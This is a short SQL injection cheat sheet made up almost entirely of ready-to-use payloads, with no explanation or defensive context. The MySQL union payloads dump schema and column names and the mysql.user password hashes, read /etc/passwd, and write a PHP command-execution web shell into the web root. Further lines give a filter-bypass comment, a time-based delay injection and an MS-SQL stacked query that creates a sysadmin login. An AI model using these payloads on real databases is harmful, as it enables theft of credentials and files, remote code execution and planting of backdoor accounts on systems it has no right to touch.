## MySQL
### Union
```
1+1
hex(1)
-1 union select "1","2","3"
-1 union select "1",(select @@version),"3"
-1 union select "1",(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT 0,1),"3"
-1 union select "1",(select group_concat(SCHEMA_NAME,":") from Information_Schema.SCHEMATA), "3"
-1 union select "1",(select group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") from Information_Schema.COLUMNS where TABLE_SCHEMA='hotel'), "3"
-1 union select "1",(select group_concat(host,":",user,":",password,"\r\n") from mysql.user),"3"
-1 union select "1",(LOAD_FILE("/etc/passwd")),"3"
-1 union select "1",(TO_base64(LOAD_FILE("/etc/passwd"))),"3"
-1 union select "1",(select "<?php exec($_GET['cmd']); ?>"), "3" INTO OUTFILE '/var/www/html/cmd.php'
```
### Bypass space
```
/**/
```

### Stack and time-based
```
asdf'; WAITFOR DELAY '0:0:10'--
```

## MS-SQL add user
```
EXEC sp_addlogin 'quang', 'pass'; 
exec sys.sp_addsrvrolemember @loginame=N'quang', @rolename = N'sysadmin' ;-- -
```
